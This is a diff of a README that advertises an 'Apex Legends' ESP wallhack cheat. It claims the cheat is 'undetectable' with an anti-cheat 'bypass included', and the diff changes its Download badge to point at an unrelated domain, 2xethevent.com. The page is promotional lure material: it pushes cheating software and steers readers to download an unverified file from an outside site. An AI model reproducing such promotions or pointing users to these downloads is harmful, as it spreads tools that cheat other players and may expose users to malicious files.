@@ -7,7 +7,7 @@ Gain the ultimate visual advantage in **Apex Legends** with this powerful and un
 - 🚫 **Undetectable & Secure (Bypass Included)**  
 - 🖥️ **Clean UI + Configurable Visuals**
 
-[![Download  APEX ESP](https://img.shields.io/badge/Download-APEX%20ESP-blueviolet)]([https://resser.tech](https://2xethevent.com))
+[![Download  APEX ESP](https://img.shields.io/badge/Download-APEX%20ESP-blueviolet)](https://2xethevent.com)
 
 Play smart. See everything. Win more fights. 🏆
 
